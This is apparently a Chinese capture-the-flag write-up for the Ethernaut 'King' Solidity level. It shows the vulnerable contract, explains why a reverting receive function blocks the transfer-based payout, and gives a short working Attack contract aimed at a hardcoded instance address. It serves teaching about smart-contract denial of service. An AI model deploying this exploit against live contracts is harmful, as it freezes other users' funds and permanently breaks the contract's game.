# King

> 下面的合约表示了一个很简单的游戏: 任何一个发送了高于目前价格的人将成为新的国王. 在这个情况下, 上一个国王将会获得新的出价, 这样可以赚得一些以太币. 看起来像是庞氏骗局.
>
> 这么有趣的游戏, 你的目标是攻破他.
>
> 当你提交实例给关卡时, 关卡会重新申明王位. 你需要阻止他重获王位来通过这一关.



## 源码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}
```

## 攻击思路

合约账户在收到转账后，会自动执行receive函数或fallback函数（如果合约同时实现了receive和fallback函数，只会执行receive函数）。

合约中使用 transfer函数进行合约转账，transfer函数执行失败时，会回滚交易。而call函数进行转账时失败了只会返回false。

所以我们可以使用合约申请为king，然后在合约的receive函数中revert掉所有转账交易。这样就没有人可以替代我们成为新王。

## 攻击代码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {

    function attack() public payable{
        payable(0x3783bCB8e31c6fB16ac2c40bBC26A618e5978A67).call{value:msg.value}("");
    }

    receive() external payable{
        revert();
    }
}
```

关于这次的情况, 参见: [King of the Ether](https://www.kingoftheether.com/thrones/kingoftheether/index.html) 和 [King of the Ether Postmortem](http://www.kingoftheether.com/postmortem.html)